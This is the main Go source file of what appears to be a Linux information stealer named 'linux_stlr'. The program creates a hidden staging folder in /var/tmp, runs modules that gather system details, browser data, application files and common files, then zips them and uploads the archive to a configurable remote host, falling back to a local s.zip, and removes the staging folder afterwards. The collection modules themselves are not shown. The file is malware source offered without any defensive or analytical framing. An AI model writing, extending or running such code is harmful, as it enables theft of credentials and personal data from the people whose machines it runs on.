package main

import (
	"linux_stlr/modules/applicationfiles"
	"linux_stlr/modules/browsers"
	"linux_stlr/modules/commonfiles"
	"linux_stlr/modules/system"
	"linux_stlr/utils/fileutil"
	"linux_stlr/utils/requests"
	"log"
	"os"
)

const stagingfolder = "/var/tmp/s"

var Host string

func main() {
	os.MkdirAll(stagingfolder, os.FileMode(0777))
	defer os.RemoveAll(stagingfolder)

	system.Run(stagingfolder)
	browsers.Run(stagingfolder)
	applicationfiles.Run(stagingfolder)
	commonfiles.Run(stagingfolder)

	zip, err := fileutil.ZipDir(stagingfolder)
	if err != nil {
		log.Fatal(err)
	}

	if Host != "" {
		var config requests.Config
		config.Host = Host
		requests.SetRequestInfo(config)
		_, _, err = requests.PostFile(zip)
		if err != nil {
			log.Fatal(err)
		}
	} else {
		c, err := os.ReadFile(zip)
		if err != nil {
			log.Fatal(err)
		}
		err = os.WriteFile("./s.zip", c, os.FileMode(0666))
		if err != nil {
			log.Fatal(err)
		}
	}

}
